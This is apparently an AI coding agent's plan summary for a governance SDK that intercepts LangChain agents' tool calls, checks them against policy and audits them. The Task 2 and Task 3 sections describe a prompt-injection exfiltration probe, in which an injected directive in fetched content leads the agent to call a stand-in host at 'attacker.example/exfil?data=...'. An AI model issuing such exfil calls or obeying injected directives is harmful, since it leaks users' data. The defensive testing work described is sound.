---
phase: 01-walking-skeleton
plan: 06
subsystem: sdk
tags: [langchain, langgraph, middleware, pep, wrap_tool_call, awrap_tool_call, agentmiddleware, e2e, red-team, regression-lock, exfil-injection, d-04, sqlite, audit-chain]

# Dependency graph
requires:
  - phase: 01-01
    provides: "agentos-contract (AgentAction, ActionType.tool_call, Decision, Outcome, Reason, PipelineProtocol) + the tests/conftest placeholder fixtures + the regression_lock/floor_invariant pytest markers"
  - phase: 01-02
    provides: "agentos-controlplane Registry.register/issue_token (EdDSA) + AuditWriter.append (hash-chained, fail-closed) + the SQLite-backed Store"
  - phase: 01-03
    provides: "agentos_pipeline.risk PromptInjectionScorer (SEC-01 inline detector)"
  - phase: 01-04
    provides: "agentos_pipeline.policy WasmPolicyEngine(egress.wasm, allowlist) — the deterministic OPA WASM egress floor"
  - phase: 01-05
    provides: "agentos_pipeline.runner Pipeline.evaluate(action) -> Decision (async PDP) + IdentityStage; the PEP<->PDP seam"
provides:
  - "agentos-sdk package — the data-plane PEP (depends ONLY on contract + pipeline; PEP logic never leaks into the PDP)"
  - "GovernanceMiddleware(AgentMiddleware).awrap_tool_call — intercepts tool calls, normalizes to AgentAction, awaits pipeline.evaluate, enforces allow(run handler)/deny(ToolMessage without calling handler) (INT-01/SDK-01/D-03)"
  - "normalize_action(request, token) -> AgentAction — ToolCallRequest translation; agent_id read from the token sub claim WITHOUT verifying (PDP owns verification, Anti-Pattern 5)"
  - "http_get — the single minimal stdlib-urllib governed tool (D-01 test fixture)"
  - "filled tests/conftest fixtures: prompt_injection_scorer, registered_agent_token, pipeline_with_principle, pipeline_without_principle (WiredPipeline bundling pipeline + the registered token)"
  - "tests/integration/test_e2e_slice.py — the end-to-end vertical slice against the SQLite Store (allow runs + 1 audit; deny blocks + audit; chain links)"
  - "tests/redteam/test_exfil_injection.py — the D-04 regression-lock gate (deleting the egress principle flips deny->allow and breaks CI)"
affects: [phase-02-interception-surface, phase-03-graduated-enforcement, phase-04-audit-hardening, phase-05-control-plane-api]

# Tech tracking
tech-stack:
  added: []  # langchain/langgraph were already declared in the workspace pyproject by 01-01; the SDK package consumes them
  patterns:
    - "PEP at the LangChain v1 seam: GovernanceMiddleware subclasses AgentMiddleware and overrides the async awrap_tool_call hook; deny short-circuits by NOT calling handler (the entire allow/deny enforcement mechanism, D-03)"
    - "Async hook chosen over sync: langchain 1.3.2 DOES expose awrap_tool_call (Open Q2 RESOLVED) -> await pipeline.evaluate directly; pipeline + audit write stay async; NEVER asyncio.run inside the hook (already in a running loop)"
    - "SDK depends on contract + pipeline only — the pipeline owns the audit writer it was constructed with; no control-plane import in the SDK (Anti-Pattern 5)"
    - "Data-plane token peek without verification: normalize reads the sub claim with verify_signature=False; the PDP's stage-1 identity verify is the authoritative check (the PEP must not duplicate PDP logic)"
    - "Regression lock isolates the FLOOR from the detector: the WITHOUT-principle probe uses a BENIGN body so the graduated risk stage cannot mask the floor's removal — only the egress principle could block, and with it removed the probe is allowed"

key-files:
  created:
    - "packages/sdk/pyproject.toml"
    - "packages/sdk/README.md"
    - "packages/sdk/src/agentos_sdk/__init__.py"
    - "packages/sdk/src/agentos_sdk/normalize.py"
    - "packages/sdk/src/agentos_sdk/middleware.py"
    - "packages/sdk/src/agentos_sdk/tools.py"
    - "tests/unit/test_middleware.py"
    - "tests/integration/test_e2e_slice.py"
    - "tests/redteam/__init__.py"
    - "tests/redteam/test_exfil_injection.py"
  modified:
    - "tests/conftest.py"
    - "pyproject.toml"
    - "uv.lock"

key-decisions:
  - "Open Q2 RESOLVED: langchain 1.3.2 exposes BOTH wrap_tool_call and awrap_tool_call (verified at plan time via inspect). Chose the ASYNC path (awrap_tool_call) so the pipeline and its async audit write run inside the existing LangGraph event loop without a sync DB path or a nested loop."
  - "pipeline_without_principle models 'the principle removed' as an allow-all PolicyEngine (same Protocol), NOT an empty allowlist — verified that an EMPTY allowlist still DENIES (the Rego floor is deny-by-default), so it would not flip the probe; deleting the principle is what flips deny->allow."
  - "The WITHOUT-principle red-team probe uses a BENIGN fetched body (the WITH-principle one uses the injected directive). The graduated stage denies on risk>=0.7 regardless of the floor, so an injected body in the no-principle case would deny via risk and MASK the floor removal — defeating the lock. The host (the floor's signal) stays identical."
  - "The e2e test drives the middleware directly with a constructed ToolCallRequest rather than spinning up a real LLM via create_agent — the middleware is model-agnostic (it sees only the tool-call request), so a real model adds network/nondeterminism without exercising any extra governed path. create_agent remains the documented production attach point."
  - "normalize_action resolves agent_id from the token's sub claim with verify_signature=False; verification is the pipeline's stage-1 job (Anti-Pattern 5). A missing/garbled token yields agent_id='' so the PDP's identity stage denies it (fail-closed)."

patterns-established:
  - "GovernanceMiddleware.awrap_tool_call: normalize -> await pipeline.evaluate -> deny returns ToolMessage(reasons, request.tool_call['id']) without calling handler; allow returns await handler(request)"
  - "WiredPipeline fixture bundle: pipeline + the registered agent's signed token, so probes that build an action without a token can attach a valid one before evaluate (stage-1 identity needs it to reach the floor)"
  - "D-04 regression lock: WITH-principle deny (egress_allowlist_violation) + WITHOUT-principle allow; deleting the principle turns the deny test RED (CI-break proof verified)"

requirements-completed: [INT-01, SDK-01]

# Metrics
duration: 11min
completed: 2026-06-02
---

# Phase 1 Plan 06: SDK PEP + End-to-End Slice + D-04 Red-Team Gate Summary

**The Walking Skeleton's proof-of-life: a LangChain v1 `GovernanceMiddleware.awrap_tool_call` intercepts an `http_get` tool call, normalizes it to an `AgentAction`, awaits the 4-stage pipeline, and enforces allow (the tool runs) / deny (a `ToolMessage` is returned WITHOUT calling the handler — no egress); the end-to-end test proves the whole loop against the SQLite Store with one hash-chained audit record per action; and the D-04 regression lock proves the deterministic egress principle — not the detector — is the authoritative block (deleting it flips the exfil probe deny→allow and breaks CI).**

## Performance

- **Duration:** ~11 min wall-clock
- **Started:** 2026-06-01T19:22:53Z
- **Completed:** 2026-06-02 (~19:33Z)
- **Tasks:** 3 of 3 (Task 1 was TDD: RED → GREEN)
- **Files modified:** 13 (10 created + 3 modified)

## Accomplishments

- **Task 1 — the SDK PEP (INT-01/SDK-01):** `GovernanceMiddleware(AgentMiddleware)` overrides the async `awrap_tool_call` hook: `normalize_action(request, token)` → `await pipeline.evaluate(action)` → on `deny` return `ToolMessage(content="Blocked by agentos-guard: {reasons}", tool_call_id=request.tool_call["id"])` WITHOUT calling `handler` (the tool never executes — no egress, D-03); else `await handler(request)`. `normalize_action` builds the `AgentAction` (tool_call, target, payload, identity_token) and reads `agent_id` from the token's `sub` claim without verifying (the PDP verifies in stage 1). `http_get` is a minimal stdlib-urllib governed tool. The SDK depends on `agentos-contract` + `agentos-pipeline` only.
- **Task 2 — the end-to-end vertical slice (D-01/D-03):** filled the four conftest placeholders against the SQLite Store and wrote `test_e2e_slice.py`. An allowlisted `http_get("https://api.example.com/...")` runs the tool (handler called once) and appends exactly one `audit_record` with outcome `allow`; an attacker `http_get("https://attacker.example/exfil?data=...")` is blocked (handler NOT called), outcome `deny`, audit record carrying `egress_allowlist_violation`; the two records hash-chain (`second.prev_hash == first.record_hash`).
- **Task 3 — the D-04 red-team regression lock (proof-of-life):** `test_exfil_injection.py` with `@pytest.mark.regression_lock`. WITH the principle the probe is denied (`egress_allowlist_violation`); WITHOUT it the same-host probe (benign body) is allowed; the SEC-01 detector independently flags `exfil_directive` at `risk_score >= 0.4` (advisory). The CI-break property was verified by simulating the principle's deletion and confirming the WITH-principle deny test turns RED.
- **Verification — all green:**
  - `pytest tests/unit/test_middleware.py -x` → **4 passed**
  - `pytest tests/integration/test_e2e_slice.py -x` → **3 passed**
  - `pytest tests/redteam/test_exfil_injection.py -m regression_lock --maxfail=1` → **2 passed, 1 deselected**
  - Full suite → **122 passed, 2 xfailed** (no regressions); `opa test policies/` → **PASS 2/2**; detector determinism `pytest tests/unit -k detector --count=100` → **2700 passed** (non-flaky)
  - `grep -Fc "asyncio.run" middleware.py` → **0**; `grep -c "regression_lock" test_exfil_injection.py` → **3** (≥2)

## Task Commits

1. **Task 1: SDK middleware (TDD)** — `6e1b093` (test, RED) → `b5f12c3` (feat, GREEN)
2. **Task 2: end-to-end slice + conftest fixtures** — `ea5cf8a` (feat)
3. **Task 3: D-04 red-team regression-lock gate** — `2f05ec8` (feat)

**Plan metadata:** committed separately (docs: complete plan).

_Task 1 produced the expected TDD `test → feat` gate sequence; no refactor commit was needed (the GREEN implementation was already minimal). Tasks 2 and 3 are `feat` (test-and-fixture wiring of already-built components; not new behavior-under-test in the TDD sense)._

## Files Created/Modified

- `packages/sdk/pyproject.toml` — the agentos-sdk package (deps: agentos-contract, agentos-pipeline, langchain, langgraph).
- `packages/sdk/README.md` — what the PEP is and the allow/deny contract.
- `packages/sdk/src/agentos_sdk/__init__.py` — exports `GovernanceMiddleware`, `normalize_action`.
- `packages/sdk/src/agentos_sdk/normalize.py` — `normalize_action(request, token) -> AgentAction`.
- `packages/sdk/src/agentos_sdk/middleware.py` — `GovernanceMiddleware.awrap_tool_call`, the async PEP hook.
- `packages/sdk/src/agentos_sdk/tools.py` — `http_get`, the single governed tool (stdlib urllib).
- `tests/unit/test_middleware.py` — the four PEP behavior cases (normalize / allow / deny / no nested loop).
- `tests/integration/test_e2e_slice.py` — the end-to-end slice (allow runs + audit; deny blocks + audit; chain links).
- `tests/redteam/__init__.py` — the red-team harness package marker.
- `tests/redteam/test_exfil_injection.py` — the D-04 regression-lock gate.
- `tests/conftest.py` — filled the four placeholder fixtures against the SQLite Store; added `WiredPipeline` + the allow-all "principle removed" engine.
- `pyproject.toml` — workspace: add agentos-sdk member dependency + source.
- `uv.lock` — agentos-sdk built + installed editable.

## Decisions Made

- **Async hook chosen (Open Q2 RESOLVED).** `langchain 1.3.2` exposes both `wrap_tool_call` (sync) and `awrap_tool_call` (async, handler returns an `Awaitable`) — verified via `inspect` at plan time. The async path is cleaner for the skeleton: the pipeline and its async audit write run inside the existing LangGraph event loop with no sync DB path and no nested loop. `grep -Fc "asyncio.run"` on the middleware is 0.
- **"Principle removed" = allow-all engine, not empty allowlist.** Verified empirically that an empty allowlist still DENIES the attacker host (the Rego floor is deny-by-default). Modeling the removed principle as an allow-all `PolicyEngine` (same Protocol) is the correct structural equivalent of deleting the floor rule, and it is deterministic (no OPA-CLI recompile at test time).
- **Benign body in the WITHOUT-principle probe.** The graduated stage denies on `risk >= 0.7` regardless of the floor; an injected body in the no-principle case would deny via risk and mask the floor's removal. Using a benign body (same attacker host) isolates the floor, so the lock genuinely tests the principle (see Deviations Rule 1).
- **Drive the middleware directly in e2e.** A constructed `ToolCallRequest` exercises the full PEP→PDP→audit loop without a real LLM; the middleware is model-agnostic. `create_agent(...)` is documented as the production attach point.

## Deviations from Plan

### Auto-fixed Issues

**1. [Rule 1 - Bug] WITHOUT-principle red-team probe must use a benign body to isolate the floor**
- **Found during:** Task 3 (running the regression-lock gate).
- **Issue:** The plan's Task-3(b) text says "the SAME probe with the principle removed → assert allow". Using the literal injected `fetched_content` made `test_deleting_principle_makes_attack_pass` FAIL: the graduated stage denies on `risk >= 0.7`, so the high-risk injected body denied the probe via the RISK stage even with the egress floor removed — masking the floor and defeating the lock's purpose (the lock must attribute the block to the *principle*, not the detector).
- **Fix:** The WITHOUT-principle probe uses a deliberately BENIGN body (same attacker host). This matches the RESEARCH § Red-Team Gate snippet, where `test_deleting_principle_makes_attack_pass` uses `fetched_content="..."` (a benign placeholder body) — the host is the floor's signal, the body is the detector's. With a benign body the only possible block is the egress floor; removing the floor → allow. Documented inline (`_BENIGN_BODY`) and in the commit message.
- **Files modified:** `tests/redteam/test_exfil_injection.py`
- **Verification:** `pytest tests/redteam/test_exfil_injection.py -m regression_lock --maxfail=1` → 2 passed; the CI-break simulation (point the WITH-principle wiring at the allow-all engine) confirms the deny test turns RED.
- **Committed in:** `2f05ec8` (Task 3 commit)

**2. [Rule 3 - Blocking] Red-team module cannot import the conftest `make_http_get` helper**
- **Found during:** Task 3 (first gate run errored at collection).
- **Issue:** The RESEARCH snippet calls `make_http_get(...)` as if globally available, but it is a plain helper in `conftest.py`, not a fixture, and `tests` is not an importable package (`ModuleNotFoundError: No module named 'tests'`).
- **Fix:** Defined a local `make_http_get` in the red-team module (mirroring the conftest helper with the same `agent_id="test-agent"` so the registered token's `sub` matches), following the established project convention where test modules define their own builders (e.g. `test_e2e_slice._request`).
- **Files modified:** `tests/redteam/test_exfil_injection.py`
- **Verification:** collection succeeds; gate green.
- **Committed in:** `2f05ec8` (Task 3 commit)

---

**Total deviations:** 2 auto-fixed (1 bug, 1 blocking). **Impact:** Both were necessary for a correct, deterministic D-04 gate; no scope creep, no architectural change. Deviation 1 is the substantive one — it makes the regression lock actually attribute the block to the principle (its entire purpose).

## Issues Encountered

- The `pytest-benchmark` plugin's benchmark stat tables (from the 01-04 policy/01-05 pipeline benchmarks) print to stdout and visually mask the pass/fail summary line; ran verification with `-p no:benchmark` to read the summary cleanly. Test results are unaffected (this is display noise, not a failure). The pre-existing `opa-wasmtime` atexit `min() iterable` stderr quirk (logged in 01-05's deferred-items) persists and is likewise harmless — neither is in scope for this plan.

## Known Stubs

None that block the plan goal. Intentional, documented seams:
- `_AllowAllPolicyEngine` in `tests/conftest.py` is NOT a stub — it is the deliberate "egress principle removed" mechanism the D-04 lock requires (the structural equivalent of deleting the Rego floor rule).
- `normalize_action` reads the token `sub` without verifying — intentional (the PDP's stage-1 identity verify is the authoritative check; Anti-Pattern 5). Not a stub.
- `http_get` is intentionally minimal (a D-01 test fixture, not the product).

## Threat Flags

None. The surface introduced (a LangChain middleware PEP at the tool-call seam, the e2e + red-team test harnesses) is exactly the surface enumerated in the plan's `<threat_model>` (T-01-19 exfil short-circuit, T-01-20 injection floor, T-01-21 no PEP-in-PDP leak, T-01-22 no nested loop). No new network endpoints, auth paths, or trust-boundary schema beyond the plan. The `http_get` tool performs egress only AFTER the PDP returns `allow` (a `deny` short-circuits before `handler`).

## User Setup Required

None new this plan. The SDK is wired entirely from already-installed workspace packages; the only external artifact it transitively relies on (`policies/build/egress.wasm`) is the 01-04 build artifact, present locally (`tools/opa/opa.exe`) and regenerated in CI.

## Next Phase Readiness

- **The Walking Skeleton is closed.** The full vertical slice (intercept → 4-stage PDP → allow/deny → one hash-chained audit record) works end-to-end against the SQLite Store, and the D-04 regression lock provably bites. Phase 1's done-criterion (D-04) is satisfied.
- **For Phase 2 (interception surface):** `GovernanceMiddleware` is the PEP pattern to extend to the other `ActionType`s (memory_access, mcp_call, model_invocation, delegation); `normalize_action` is the single translation seam to generalize. The async `awrap_tool_call` choice means new action surfaces should also use the async hooks.
- **For Phase 4 (audit hardening) / Phase 5 (control-plane API):** the SQLite Store remains the D-14 deviation seam; Postgres concurrency / the append-only trigger / a real gateway must re-validate the chain (carried forward from 01-02/01-05).

## Self-Check: PASSED

- All 10 created files verified present on disk (see Files Created/Modified).
- All 4 task commits verified in git history: `6e1b093` (RED), `b5f12c3` (GREEN), `ea5cf8a` (Task 2), `2f05ec8` (Task 3).
- `pytest tests/unit/test_middleware.py` → 4 passed; `tests/integration/test_e2e_slice.py` → 3 passed; `tests/redteam/test_exfil_injection.py -m regression_lock` → 2 passed; full suite → 122 passed, 2 xfailed; `opa test policies/` → PASS 2/2; detector determinism ×100 → 2700 passed.

---
*Phase: 01-walking-skeleton*
*Completed: 2026-06-02*
